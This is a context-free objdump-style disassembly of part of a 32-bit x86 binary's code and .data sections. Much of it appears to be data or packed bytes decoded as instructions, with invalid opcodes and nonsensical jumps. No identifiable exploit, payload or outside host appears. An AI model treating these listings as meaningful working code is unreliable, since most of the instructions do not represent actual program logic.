  408b61:	adc    edx,DWORD PTR [edx+0x43]
  408b64:	and    ebp,DWORD PTR [ebx+ebp*4]
  408b67:	mov    esp,0x416cfbc9
  408b6c:	cli    
  408b6d:	out    dx,al
  408b6e:	sub    ch,BYTE PTR [eax]
  408b70:	inc    eax
  408b71:	jp     0x408b52
  408b73:	out    dx,al
  408b74:	sub    cl,ch
  408b76:	dec    ebp
  408b77:	sahf   
  408b78:	outs   dx,BYTE PTR ds:[esi]
  408b79:	into   
  408b7a:	into   
  408b7b:	dec    eax
  408b7c:	js     0x408b15
  408b7e:	ins    DWORD PTR es:[edi],dx
  408b7f:	pop    edx
  408b80:	sahf   
  408b81:	mov    eax,ds:0x70fc5c09
  408b86:	push   es
  408b87:	sbb    ebx,DWORD PTR [ecx-0x1634deee]
  408b8d:	push   ebx
  408b8e:	push   ecx
  408b8f:	test   DWORD PTR [eax+0x71],edi
  408b92:	iret   
  408b93:	cs inc ebx
  408b95:	add    ecx,0x61
  408b98:	mov    ah,BYTE PTR [edi+0x56]
  408b9b:	push   edi
  408b9c:	and    ah,BYTE PTR [eax]
  408b9e:	push   edx
  408b9f:	xchg   esp,eax
  408ba0:	arpl   WORD PTR [esp+ebp*1],dx
  408ba3:	test   DWORD PTR [ecx+0x1cfd894c],edi
  408ba9:	ret    
  408baa:	repz cmp DWORD PTR [ecx-0x60957284],esp
  408bb1:	dec    eax
  408bb2:	jecxz  0x408bac
  408bb4:	sti    
  408bb5:	add    esp,0xdd837f75
  408bbb:	push   esi
  408bbc:	push   edx
  408bbd:	fnstsw WORD PTR [esi]
  408bbf:	fidiv  DWORD PTR [ebx+0x2b]
  408bc2:	lods   al,BYTE PTR ds:[esi]
  408bc3:	mov    bl,0x3e
  408bc5:	cld    
  408bc6:	int3   
  408bc7:	sub    al,0x38
  408bc9:	mov    ecx,0x7bbc1646
  408bce:	xor    DWORD PTR [edx-0x23cb8ef6],esp
  408bd4:	xchg   dh,dl
  408bd6:	sbb    ebp,ebx
  408bd8:	push   0xffffff99
  408bda:	cs nop
  408bdc:	in     eax,dx
  408bdd:	mov    ah,dh
  408bdf:	ret    0xb2f0
  408be2:	aaa    
  408be3:	clc    
  408be4:	int3   
  408be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408be6:	jl     0x408c2e
  408be8:	pop    ds
  408be9:	int3   
  408bea:	jmp    0xf655:0x77b46355
  408bf1:	cli    
  408bf2:	rdtsc  
  408bf4:	ins    BYTE PTR es:[edi],dx
  408bf5:	lock aaa 
  408bf7:	cld    
  408bf8:	inc    edx
  408bf9:	jmp    0x408be6
  408bfb:	cmp    DWORD PTR [esi],0xc8d98b0f
  408c01:	jl     0x408bc9
  408c03:	add    DWORD PTR [edx],esp
  408c05:	stc    
  408c06:	call   0x79b88ce5
  408c0b:	(bad)  
  408c0c:	call   0x14b1e53c
  408c11:	in     al,0xc3
  408c13:	dec    edx
  408c14:	dec    ecx
  408c15:	xlat   BYTE PTR ds:[ebx]
  408c16:	sahf   
  408c17:	rcr    BYTE PTR [eax+esi*8-0x64],cl
  408c1b:	mov    edi,0x4f5d9c4
  408c20:	sub    al,0x3a
  408c22:	mov    dh,0x65
  408c24:	push   esp
  408c25:	lea    edi,[edx]
  408c27:	adc    eax,0x999bf61c
  408c2c:	pop    ecx
  408c2d:	(bad)  
  408c2e:	(bad)  
  408c2f:	fdivr  DWORD PTR [ebp+0x3587db5]
  408c35:	(bad)  
  408c36:	int    0x74
  408c38:	loop   0x408c08
  408c3a:	dec    edx
  408c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3c:	mov    al,0x7b
  408c3e:	shl    BYTE PTR [eax+0x5169c966],0x92
  408c45:	push   ecx
  408c46:	repz inc esp
  408c48:	add    al,0xcf
  408c4a:	gs out 0x54,eax
  408c4d:	(bad)  
  408c4e:	push   ecx
  408c4f:	push   esi
  408c50:	dec    ebp
  408c51:	mov    BYTE PTR [ebx-0x35],dl
  408c54:	xchg   esp,ebx
  408c56:	jp     0x408bf2
  408c58:	mov    esp,0xd4d43b6f
  408c5d:	jl     0x408c5c
  408c5f:	adc    DWORD PTR [esi],ecx
  408c61:	fwait
  408c62:	mov    DWORD PTR [edx+0x6a],ebp
  408c65:	cmp    BYTE PTR [ebp+ebx*1+0xb81bc22],cl
  408c6c:	mov    esp,0x28454abf
  408c71:	push   eax
  408c72:	xor    DWORD PTR [ecx+ebp*1-0x49a3d5ae],0x57
  408c7a:	mov    dh,0xd
  408c7c:	push   0xffffff85
  408c7e:	fistp  WORD PTR [ecx]
  408c80:	and    ebx,esp
  408c82:	pop    edx
  408c83:	add    BYTE PTR [edx-0x68c329fd],bl
  408c89:	sub    dh,BYTE PTR [edi]
  408c8b:	add    esi,DWORD PTR [edx]
  408c8d:	loop   0x408c97
  408c8f:	mov    esi,0x55f8c24b
  408c94:	sub    edx,0xfffffffc
  408c97:	or     al,0x62
  408c99:	pusha  
  408c9a:	cmp    eax,0xbc0a4afe
  408c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca0:	in     eax,dx
  408ca1:	sub    bl,bl
  408ca3:	test   al,0xbf
  408ca5:	pop    esi
  408ca6:	pop    ebx
  408ca7:	leave  
  408ca8:	ret    0x10

Disassembly of section .data:

00409000 <.data>:
  409000:	push   ebp
  409001:	pop    edx
  409002:	js     0x40907e
  409004:	imul   ebx,DWORD PTR [ecx+0x4e],0x6f
  409008:	popa   
  409009:	dec    eax
  40900a:	arpl   WORD PTR [edi+0x4d],dx
  40900d:	pop    eax
  40900e:	inc    esi
  40900f:	dec    edx
  409010:	jne    0x40907d
  409012:	push   ebx
  409013:	add    BYTE PTR gs:[eax],al
  409016:	add    BYTE PTR [eax],al
  409018:	push   0x70004094
  40901d:	xchg   esp,eax
  40901e:	inc    eax
  40901f:	add    BYTE PTR [eax-0x6e],ah
  409022:	inc    eax
  409023:	add    dh,ch
  409025:	or     esi,DWORD PTR [edx-0x45b082f2]
  40902b:	dec    esi
  40902c:	pop    es
  40902d:	dec    edi
  40902e:	mov    ecx,0xbc4f2f4e
  409033:	dec    esi
  409034:	add    cl,BYTE PTR [edi+0x43]
  409037:	dec    edi
  409038:	push   ds
  409039:	dec    edi
  40903a:	inc    esi
  40903b:	dec    edi
  40903c:	jnp    0x40908d
  40903e:	inc    ebp
  40903f:	dec    edi
  409040:	mov    edx,0x5e4f4a4e
  409045:	push   edx
  409046:	pop    edi
  409047:	push   ebx
  409048:	mov    ebp,0xba4f7d4e
  40904d:	dec    esi
  40904e:	pop    es
  40904f:	dec    edi
  409050:	mov    ecx,0xbc4f2f4e
  409055:	dec    esi
  409056:	add    cl,BYTE PTR [edi+0x43]
  409059:	dec    edi
  40905a:	push   ds
  40905b:	dec    edi
  40905c:	inc    esi
  40905d:	dec    edi
  40905e:	or     eax,0xba4f454f
  409063:	dec    esi
  409064:	dec    edx
  409065:	dec    edi
  409066:	pop    esi
  409067:	bound  ebx,QWORD PTR [edi+0x63]
  40906a:	mov    ebp,0xba4f7d4e
  40906f:	dec    esi
  409070:	or     cl,BYTE PTR [edi-0x47]
  409073:	dec    esi
  409074:	jnp    0x4090c5
  409076:	mov    ebp,0x404f284e
  40907b:	dec    edi
  40907c:	mov    edx,0x5e4f444e
  409081:	jb     0x4090e2
  409083:	jae    0x4090f4
  409085:	sub    DWORD PTR [eax+eax*4+0x7c],0xffffff90
  40908a:	jge    0x40901d
  40908c:	mov    edi,0xba4f064e
  409091:	dec    esi
  409092:	push   es
  409093:	dec    edi
  409094:	mov    esi,0xbd4f284e
  409099:	dec    esi
  40909a:	jnp    0x4090eb
  40909c:	inc    ecx
  40909d:	dec    edi
  40909e:	mov    edx,0x5e4f464e
  4090a3:	sbb    BYTE PTR [edi-0x7d],0x6f
  4090a7:	xchg   ebx,eax
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	nop
  4090aa:	jl     0x40904c
  4090ac:	jge    0x40904f
  4090ae:	mov    edi,0xba4f064e
  4090b3:	dec    esi
  4090b4:	push   es
  4090b5:	dec    edi
  4090b6:	mov    esi,0xbd4f284e
  4090bb:	dec    esi
  4090bc:	or     eax,0xba4f414f
  4090c1:	dec    esi
  4090c2:	inc    esi
  4090c3:	dec    edi
  4090c4:	pop    esi
  4090c5:	xchg   edx,eax
  4090c6:	pop    edi
  4090c7:	xchg   ebx,eax
  4090c8:	outs   dx,DWORD PTR ds:[esi]
  4090c9:	mov    ds:0xb07ca06c,eax
  4090ce:	jge    0x409081
  4090d0:	mov    edi,0xba4f0c4e
  4090d5:	dec    esi
  4090d6:	cs dec edi
  4090d8:	mov    ecx,0xbd4f7b4e
  4090dd:	dec    esi
  4090de:	and    eax,0xba4f404f
  4090e3:	dec    esi
  4090e4:	inc    esi
  4090e5:	dec    edi
  4090e6:	pop    esi
  4090e7:	mov    ds:0xb36fa35f,al
  4090ec:	ins    BYTE PTR es:[edi],dx
  4090ed:	mov    al,0x7c
  4090ef:	sar    BYTE PTR [ebp-0x3f],0xbf
  4090f3:	dec    esi
  4090f4:	or     al,0x4f
  4090f6:	mov    edx,0xb94f2e4e
  4090fb:	dec    esi
  4090fc:	jl     0x40914d
  4090fe:	mov    ebp,0x434f1f4e
  409103:	dec    edi
  409104:	mov    edx,0x5e4f414e
  409109:	mov    dl,0x5f
  40910b:	mov    bl,0x6f
  40910d:	ret    
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	sar    BYTE PTR [eax+edx*8+0x7d],0xd1
  409114:	mov    edi,0xba4f0c4e
  409119:	dec    esi
  40911a:	cs dec edi
  40911c:	mov    ecx,0xbd4f0a4e
  409121:	dec    esi
  409122:	cs dec edi
  409124:	inc    eax
  409125:	dec    edi
  409126:	mov    edx,0x5e4f444e
  40912b:	ret    0xc35f
  40912e:	outs   dx,DWORD PTR ds:[esi]
  40912f:	shr    DWORD PTR [eax+edx*8+0x7c],cl
  409133:	loopne 0x4091b2
  409135:	loope  0x4090f6
  409137:	dec    esi
  409138:	or     al,0x4f
  40913a:	mov    edx,0xb94f2e4e
  40913f:	dec    esi
  409140:	or     ecx,DWORD PTR [edi-0x43]
  409143:	dec    esi
  409144:	sub    BYTE PTR [edi+0x40],cl
  409147:	dec    edi
  409148:	mov    edx,0x5e4f464e
  40914d:	rcr    BYTE PTR [edi-0x2d],cl
  409150:	outs   dx,DWORD PTR ds:[esi]
  409151:	jecxz  0x4091bf
  409153:	loopne 0x4091d1
  409155:	lock jge 0x409149
  409158:	mov    edi,0xba4f094e
  40915d:	dec    esi
  40915e:	pop    ds
  40915f:	dec    edi
  409160:	mov    ecx,0xbe4f2a4e
  409165:	dec    esi
  409166:	mov    edx,0x5e4ebf4e
  40916b:	loop   0x4091cc
  40916d:	jecxz  0x4091de
  40916f:	rep ins BYTE PTR es:[edi],dx
  409171:	lock jl 0x409174
  409174:	jge    0x409177
  409176:	jl     0x409188
  409178:	jge    0x40918b
  40917a:	mov    esi,0xba4f7f4e
  40917f:	dec    esi
  409180:	and    ecx,DWORD PTR [edi-0x48]
  409183:	dec    esi
  409184:	or     cl,BYTE PTR [edi-0x42]
  409187:	dec    esi
  409188:	sub    DWORD PTR [edi+0x43],ecx
  40918b:	dec    edi
  40918c:	mov    edx,0x5e4f414e
  409191:	add    bl,BYTE PTR [edi+0x3]
  409194:	outs   dx,DWORD PTR ds:[esi]
  409195:	adc    ebp,DWORD PTR [eax+edx*1+0x7c]
  409199:	and    BYTE PTR [ebp+0x21],bh
  40919c:	mov    edi,0x2800004e
  4091a1:	nop
  4091a2:	inc    eax
  4091a3:	add    BYTE PTR [edx+edx*4],bl
  4091a6:	inc    eax
  4091a7:	add    BYTE PTR [edx+edx*4],ah
  4091aa:	inc    eax
  4091ab:	add    BYTE PTR [esp+edx*4+0x40],dh
  4091af:	add    al,bl
  4091b1:	xchg   ebx,eax
  4091b2:	inc    eax
  4091b3:	add    BYTE PTR [esp+edx*4+0x40],ah
  4091b7:	add    BYTE PTR [edx+edx*4],al
  4091ba:	inc    eax
  4091bb:	add    BYTE PTR [eax],cl
  4091bd:	xchg   edx,eax
  4091be:	inc    eax
  4091bf:	add    BYTE PTR [esp+edx*4+0x40],bl
  4091c3:	add    BYTE PTR [edx+edx*4+0x40],ch
  4091c7:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  4091ce:	pushf  
  4091cf:	clc    
  4091d0:	and    BYTE PTR [edx-0x6c6bffc0],dl
  4091d6:	inc    eax
  4091d7:	add    BYTE PTR [eax-0x4bffbf6d],ch
  4091dd:	xchg   ebx,eax
  4091de:	inc    eax
  4091df:	add    ah,al
  4091e1:	xchg   ebx,eax
  4091e2:	inc    eax
  4091e3:	add    BYTE PTR [eax-0x6e],bl
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [eax+edx*4],ah
  4091ea:	inc    eax
  4091eb:	add    BYTE PTR [eax-0x6e],bh
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [eax-0x6e],ch
  4091f2:	inc    eax
  4091f3:	add    BYTE PTR [eax-0x6c],bh
  4091f6:	inc    eax
  4091f7:	add    BYTE PTR ds:0x90f89c85,dh
  4091fd:	or     edx,DWORD PTR [edi]
  4091ff:	sub    DWORD PTR [edx+edx*4],0x1c930040
  409206:	push   ss
  409207:	or     DWORD PTR [edi+0x7050d],0xf6004000
  409211:	mov    ss,ebx
  409213:	dec    esp
  409214:	cmp    al,0xc8
  409216:	inc    edx
  409217:	add    BYTE PTR [edx+0x7a],bl
  40921a:	ja     0x409273
  40921c:	(bad)  
  40921d:	cli    
  40921e:	jne    0x409282
  409220:	(bad)  
  409221:	in     eax,dx
  409222:	inc    BYTE PTR [edi]
  409224:	mov    esi,0x1405a3fa
  409229:	xchg   edx,eax
  40922a:	inc    eax
  40922b:	add    BYTE PTR [edx*4-0x69cb0764],dh
  409232:	pushf  
  409233:	clc    
  409234:	xor    edx,DWORD PTR [ebp-0x6acd0764]
  40923a:	pushf  
  40923b:	clc    
  40923c:	xor    DWORD PTR [ebp-0x6acf0764],edx
  409242:	pushf  
  409243:	clc    
  409244:	aas    
  409245:	xchg   ebp,eax
  409246:	pushf  
  409247:	clc    
  409248:	ds xchg ebp,eax
  40924a:	pushf  
  40924b:	clc    
  40924c:	cmp    eax,0x3cf89c95
  409251:	xchg   ebp,eax
  409252:	pushf  
  409253:	clc    
  409254:	and    eax,0xe1f89c95
  409259:	stc    
  40925a:	add    esp,DWORD PTR [eax+0x1c]
  40925d:	nop
  40925e:	inc    eax
  40925f:	add    BYTE PTR [ecx],al
  409261:	xchg   ebx,eax
  409262:	inc    edx
  409263:	add    BYTE PTR [ebx+edx*2+0x7a],dh
  409267:	dec    esp
  409268:	xor    eax,0x90f89c85
  40926d:	jmp    0x126699c2
  409272:	add    BYTE PTR [eax],al
  409274:	sbb    BYTE PTR [eax+0xb920040],dl
  40927a:	add    al,0xe
	...
  4092ac:	(bad)  
  4092ad:	mov    ds:0x42,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	dec    ebp
  4092b5:	add    BYTE PTR [edx+0x0],cl
  4092b8:	inc    esp
  4092b9:	add    BYTE PTR [ebx+0x0],ch
  4092bc:	ins    DWORD PTR es:[edi],dx
  4092bd:	add    BYTE PTR [eax+eax*1],ch
  4092c0:	add    BYTE PTR fs:[ebx+0x0],dh
  4092c4:	add    BYTE PTR cs:[ebx+0x0],ch
  4092c8:	popa   
  4092c9:	add    BYTE PTR [esi+0x0],ah
  4092cc:	push   0x0
  4092ce:	imul   eax,DWORD PTR [eax],0x64
  4092d1:	add    BYTE PTR [eax+eax*1+0x73],ch
  4092d5:	add    BYTE PTR [edx+0x0],ch
  4092d8:	data16 add BYTE PTR [eax+eax*1+0x6b],ch
  4092dd:	add    BYTE PTR [eax+eax*1+0x73],ah
  4092e1:	add    BYTE PTR [esi+0x0],ah
  4092e4:	add    BYTE PTR [bx+si],al
  4092e7:	add    BYTE PTR [ebx+0x0],cl
  4092ea:	push   ebp
  4092eb:	add    BYTE PTR [eax+eax*1+0x4a],al
  4092ef:	add    BYTE PTR [edi+0x0],ch
  4092f2:	imul   eax,DWORD PTR [eax],0x6a
  4092f5:	add    BYTE PTR [edx+0x0],ch
  4092f8:	ins    BYTE PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebx+0x0],ch
  4092fc:	jae    0x4092fe
  4092fe:	add    BYTE PTR fs:[edx+0x0],ch
  409302:	jae    0x409304
  409304:	popa   
  409305:	add    BYTE PTR [edi+0x0],ch
  409308:	imul   eax,DWORD PTR [eax],0x640066
  40930e:	jae    0x409310
  409310:	ins    BYTE PTR es:[edi],dx
  409311:	add    BYTE PTR [ebx+0x0],ch
  409314:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409319:	add    BYTE PTR [esi+0x0],ah
  40931c:	push   0x0
  40931e:	add    BYTE PTR fs:[ebx+0x0],dh
  409322:	ins    BYTE PTR es:[edi],dx
  409323:	add    BYTE PTR [esi+0x0],ah
  409326:	jae    0x409328
  409328:	add    BYTE PTR fs:[eax],al
  40932b:	add    BYTE PTR [ecx+ecx*2+0x44],cl
  40932f:	outs   dx,DWORD PTR ds:[esi]
  409330:	jo     0x409381
  409332:	dec    ecx
  409333:	dec    ebx
  409334:	inc    esp
  409335:	dec    ecx
  409336:	dec    edx
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	imul   ebp,DWORD PTR [edx+0x6b],0x68736466
  40933f:	imul   sp,WORD PTR [si+0x0],0x0
  409346:	add    BYTE PTR [eax],al
  409348:	dec    ebx
  409349:	add    BYTE PTR [ebp+0x0],dl
  40934c:	inc    esp
  40934d:	add    BYTE PTR [edx+0x0],cl
  409350:	outs   dx,DWORD PTR ds:[esi]
  409351:	add    BYTE PTR [ebx+0x0],ch
  409354:	push   0x0
  409356:	push   0x0
  409358:	ins    BYTE PTR es:[edi],dx
  409359:	add    BYTE PTR [ebx+0x0],ch
  40935c:	jae    0x40935e
  40935e:	add    BYTE PTR fs:[edx+0x0],ch
  409362:	jae    0x409364
  409364:	popa   
  409365:	add    BYTE PTR [edi+0x0],ch
  409368:	imul   eax,DWORD PTR [eax],0x640066
  40936e:	jae    0x409370
  409370:	ins    BYTE PTR es:[edi],dx
  409371:	add    BYTE PTR [ebx+0x0],ch
  409374:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409379:	add    BYTE PTR [esi+0x0],ah
  40937c:	push   0x0
  40937e:	add    BYTE PTR fs:[ebx+0x0],dh
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	add    BYTE PTR [esi+0x0],ah
  409386:	jae    0x409388
  409388:	add    BYTE PTR fs:[eax],al
  40938b:	add    BYTE PTR [eax],al
  40938d:	add    BYTE PTR [eax],al
  40938f:	add    BYTE PTR ds:0x2100406f,bl
  409395:	dec    edi
  409396:	pop    ds
  409397:	dec    edi
  409398:	sub    BYTE PTR [edi+0x24],cl
  40939b:	dec    edi
  40939c:	pop    ds
  40939d:	dec    edi
  40939e:	es dec edi
  4093a0:	imul   ecx,DWORD PTR [edi+0x68],0x4eba4f
  4093a7:	add    BYTE PTR ds:0x234f1e4f,bl
  4093ad:	dec    edi
  4093ae:	imul   ecx,DWORD PTR [edi+0x68],0x2f4eba4f
  4093b5:	dec    edi
  4093b6:	sub    DWORD PTR [edi+0x1f],ecx
  4093b9:	dec    edi
  4093ba:	sub    BYTE PTR [edi+0x69],cl
  4093bd:	dec    edi
  4093be:	push   0x4eba4f
  4093c3:	add    BYTE PTR [ecx],ch
  4093c5:	dec    edi
  4093c6:	and    cl,BYTE PTR [edi+0x26]
  4093c9:	dec    edi
  4093ca:	sub    eax,0x2a4f1b4f
  4093cf:	dec    edi
  4093d0:	and    ecx,DWORD PTR [edi-0x46]
  4093d3:	dec    esi
  4093d4:	add    BYTE PTR [eax],al
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	push   cs
  4093d9:	jge    0x4093e9
  4093db:	lea    ecx,[esi]
  4093dd:	popf   
  4093de:	push   cs
  4093df:	lods   eax,DWORD PTR ds:[esi]
  4093e0:	push   cs
  4093e1:	mov    ebp,0xdd0ecd0e
  4093e6:	push   cs
  4093e7:	in     eax,dx
  4093e8:	push   cs
  4093e9:	std    
  4093ea:	push   cs
  4093eb:	or     eax,0x2d0e1d0e
  4093f0:	push   cs
  4093f1:	cmp    eax,0x6d0e5d0e
  4093f6:	push   cs
  4093f7:	jb     0x409407
  4093f9:	jae    0x409409
  4093fb:	jo     0x40940b
  4093fd:	jno    0x40940d
  4093ff:	jbe    0x40940f
  409401:	ja     0x409411
  409403:	je     0x409413
  409405:	jne    0x409415
  409407:	mov    cl,BYTE PTR [esi]
  409409:	mov    ecx,DWORD PTR [esi]
  40940b:	mov    BYTE PTR [esi],cl
  40940d:	mov    DWORD PTR [esi],ecx
  40940f:	mov    cs,WORD PTR [esi]
  409411:	jl     0x409431
  409413:	jge    0x409443
  409415:	jge    0x409455
  409417:	jge    0x409435
  409419:	(bad)  
  40941a:	jge    0x40948c
  40941c:	cmp    eax,0x79730eb1
  409421:	vptestnmw k7{k7},xmm7,QWORD PTR [eax+0x0]{1to2}
  409428:	sub    eax,0x3d56c317
  40942d:	hlt    
  40942e:	xor    dh,BYTE PTR [edi]
  409430:	xor    bh,BYTE PTR [esi-0x23]
  409433:	jno    0x409449
  409435:	mov    cl,0x70
  409437:	imul   ecx,esp,0x8
  40943a:	mov    al,ds:0x3005efd7
  40943f:	xlat   BYTE PTR ds:[ebx]
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	xchg   ebx,eax
  409442:	sub    al,0x11
  409444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409445:	jge    0x4093f2
  409447:	fidiv  WORD PTR [edi+0x64a6f6c9]
  40944d:	xor    dl,dl
  40944f:	pop    ds
  409450:	adc    cl,dh
  409452:	and    al,0xc6
  409454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409455:	sbb    BYTE PTR [ebp+0x71],ah
  40945b:	add    bh,ch
  40945d:	(bad)  [ebx+0x7]
  409460:	je     0x4093f4
  409462:	inc    eax
  409463:	add    BYTE PTR [edi+0x40],dl
  409466:	shl    DWORD PTR [ebx],1
  409468:	mov    bh,0x79
  40946a:	inc    edx
  40946b:	add    BYTE PTR [edx+0x62],bl
  40946e:	push   esp
  40946f:	addr16 or al,0x92
  409472:	inc    eax
  409473:	add    BYTE PTR [eax-0x6e],dh
  409476:	inc    eax
  409477:	add    BYTE PTR [edi+0x440712ed],cl
  40947d:	popa   
  40947e:	dec    eax
  40947f:	push   edi
  409480:	dec    ecx
  409481:	jne    0x4094f8
  409483:	pop    eax
  409484:	jns    0x4094d8
  409486:	dec    esp
  409487:	inc    edi
  409488:	inc    ebx
  409489:	popa   
  40948a:	jns    0x4094fb
  40948c:	push   0x42467568
  409491:	inc    esp
  409492:	inc    edx
  409493:	jne    0x409506
  409495:	push   ecx
  409496:	push   ebp
  409497:	jno    0x409502
  409499:	jb     0x4094e5
  40949b:	ins    WORD PTR es:[edi],dx
  40949d:	arpl   WORD PTR [esi+0x46],cx
  4094a0:	bound  esi,QWORD PTR [eax+0x4a]
  4094a3:	js     0x4094a5
	...
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [ebp+0x56],al
  4094ba:	push   cx
  4094bc:	ja     0x409524
  4094be:	inc    esi
  4094bf:	gs inc ebp
  4094c1:	inc    ebx
  4094c2:	dec    ebx
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	imul   ecx,DWORD PTR [esi+0x58],0x64
  4094c8:	push   edx
  4094c9:	dec    edx
  4094ca:	push   0x63
  4094cc:	push   0x636e707a
  4094d1:	push   ebx
  4094d2:	jne    0x40951d
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	jo     0x40951b
  4094d8:	inc    ebp
  4094d9:	jp     0x40953f
  4094db:	add    BYTE PTR [eax+0x41],dh
  4094de:	dec    ecx
  4094df:	inc    edx
  4094e0:	inc    cx
  4094e2:	inc    ebx
  4094e3:	jbe    0x40953d
  4094e5:	push   eax
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    BYTE PTR [edi+0x4d],al
  4094ea:	pop    edx
  4094eb:	push   0x6a
  4094ed:	jp     0x409533
  4094ef:	imul   edi,DWORD PTR [edx+0x68],0x43
  4094f3:	jbe    0x4094f5
  4094f5:	add    BYTE PTR [esi+0x6c],dh
  4094f8:	inc    ebx
  4094f9:	inc    esi
  4094fa:	popa   
  4094fb:	addr16 push ebx
  4094fd:	dec    edi
  4094fe:	imul   ecx,DWORD PTR [edx+0x4d],0x444b4758
  409505:	push   edi
  409506:	jne    0x409553
  409508:	add    BYTE PTR [eax],al
  40950a:	dec    edi
  40950b:	gs push edi
  40950d:	outs   dx,BYTE PTR fs:[esi]
  40950f:	pop    ecx
  409510:	push   esi
  409511:	push   0xc30c004d
  409516:	dec    ebp
  409517:	icebp  
  409518:	iret   
  409519:	(bad)  
  40951a:	mov    esp,0x99b5a4ff
  40951f:	loopne 0x409512
  409521:	pop    ebx
  409522:	stos   BYTE PTR es:[edi],al
  409523:	das    
  409524:	jge    0x40956e
  409526:	add    BYTE PTR [eax],al
  409528:	ins    BYTE PTR es:[edi],dx
  409529:	pop    es
  40952a:	add    BYTE PTR [eax],al
  40952c:	int    0x4
  40952e:	cmp    al,BYTE PTR [eax+0x5d257af7]
  409534:	imul   ecx,DWORD PTR [eax-0xa],0x38556208
  40953b:	pop    esp
  40953c:	mov    ds:0x986b84c4,eax
  409541:	scas   eax,DWORD PTR es:[edi]
  409542:	pop    esp
  409543:	idiv   dl
  409545:	les    esi,FWORD PTR [ecx+0x204e132]
  40954b:	cmp    DWORD PTR [eax],esi
  40954d:	rol    esp,1
  40954f:	mov    esi,0x41104675
  409554:	(bad)  
  409555:	fcomp  DWORD PTR [ebp+0x62]
  409558:	sbb    BYTE PTR [ebp+ebp*2+0x59],ch
  40955c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40955d:	mov    ?,WORD PTR [ebx+ebx*1+0x6a33980d]
  409564:	es loopne 0x4095aa
  409567:	jmp    0x4094f2
  409569:	aas    
  40956a:	jo     0x409505
  40956c:	in     al,dx
  40956d:	pop    ecx
  40956e:	rcl    DWORD PTR [edi],cl
  409570:	icebp  
  409571:	inc    edi
  409572:	ret    
  409573:	mov    esi,0xb037299a
  409578:	psubw  mm4,QWORD PTR [esi-0x7c]
  40957c:	xor    DWORD PTR [ecx-0x5a6b5306],ebp
  409582:	shr    BYTE PTR [ebp+0x6d813fe3],1
  409588:	in     al,dx
  409589:	addr16 inc edx
  40958b:	loopne 0x4095fd
  40958d:	mov    cs,ebp
  40958f:	cdq    
  409590:	in     eax,0x4e
  409592:	cmp    cl,0x1a
  409595:	mov    DWORD PTR [ebp+edx*8-0x80],edi
  409599:	bound  esp,QWORD PTR [ebx+0x50]
  40959c:	loope  0x4095de
  40959e:	data16 test BYTE PTR [ecx+0x44],ah
  4095a2:	retf   
  4095a3:	jnp    0x409567
  4095a5:	out    dx,eax
  4095a6:	jp     0x4095d2
  4095a8:	nop
  4095a9:	repz mov esi,0x798b3cae
  4095af:	jb     0x40960e
  4095b1:	add    al,0xd2
  4095b3:	jge    0x409547
  4095b5:	fild   DWORD PTR [ebx+0x5e]
  4095b8:	xor    dh,ch
  4095ba:	mov    al,ch
  4095bc:	xor    eax,0xf6a43006
  4095c1:	jecxz  0x4095ac
  4095c3:	add    al,0xb5
  4095c5:	and    ebp,DWORD PTR [esi-0x1b]
  4095c8:	xchg   edx,eax
  4095c9:	xor    BYTE PTR [edi+edi*2],dl
  4095cc:	push   ecx
  4095cd:	and    ch,BYTE PTR [ecx]
  4095cf:	xor    BYTE PTR [ecx+0x402e899e],bh
  4095d5:	mov    al,0x1b
  4095d7:	add    cl,al
  4095d9:	adc    DWORD PTR [esi+0x467f61fd],edi
  4095df:	pop    esi
  4095e0:	repnz test eax,0xdac81b07
  4095e6:	dec    ecx
  4095e7:	adc    al,0x1
  4095e9:	nop
  4095ea:	iret   
  4095eb:	mov    esp,0x7a648117
  4095f0:	mov    bh,0x3a
  4095f2:	fisttp QWORD PTR [edi+0x35]
  4095f5:	push   edi
  4095f6:	push   ss
  4095f7:	js     0x40965d
  4095f9:	mov    esp,0x51594f63
  4095fe:	dec    esp
  4095ff:	(bad)  
  409600:	mov    esi,0xbc0c59bb
  409605:	fmul   QWORD PTR [edx-0x77c0b9b0]
  40960b:	cwde   
  40960c:	push   0x88b943a6
  409611:	into   
  409612:	jge    0x40967d
  409614:	bound  ebp,QWORD PTR [ecx-0x16ae8cd6]
  40961a:	(bad)  
  40961b:	pop    ecx
  40961c:	fs fwait
  40961e:	push   eax
  40961f:	aaa    
  409620:	xchg   DWORD PTR [ebp-0x43],ecx
  409623:	mov    ebp,0x439f7b5a
  409628:	or     eax,0x8ac7481f
  40962d:	inc    ecx
  40962e:	xchg   edx,eax
  40962f:	dec    ebx
  409630:	dec    esp
  409631:	cmc    
  409632:	sahf   
  409633:	in     al,0x6e
  409635:	and    BYTE PTR ds:0xded688f5,al
  40963b:	mov    edx,0x98fc526b
  409640:	std    
  409641:	mov    es,ebp
  409643:	lds    ebx,FWORD PTR [ebx+0x2d6d6876]
  409649:	(bad)  [esi+0x20]
  40964c:	pop    esi
  40964d:	inc    esp
  40964e:	fwait
  40964f:	leave  
  409650:	out    0xe8,eax
  409652:	nop
  409653:	jge    0x4095de
  409655:	xchg   ebx,eax
  409656:	dec    ebp
  409657:	int3   
  409658:	scas   al,BYTE PTR es:[edi]
  409659:	pop    esi
